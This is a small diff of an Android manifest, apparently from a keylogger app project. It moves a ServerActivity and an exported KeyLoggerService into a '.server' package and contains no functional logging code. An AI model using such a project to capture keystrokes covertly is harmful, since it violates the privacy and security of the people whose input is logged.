@@ -18,7 +18,7 @@
         android:theme="@style/Theme.Keylogger"
         tools:targetApi="31">
         <activity
-            android:name=".ServerActivity"
+            android:name=".server.ServerActivity"
             android:exported="true"
             android:theme="@style/Theme.Keylogger">
             <intent-filter>
@@ -28,7 +28,7 @@
             </intent-filter>
         </activity>
 
-        <service android:name=".KeyLoggerService"
+        <service android:name=".server.KeyLoggerService"
             android:exported="true"
             android:label="@string/label"
             android:description="@string/description"
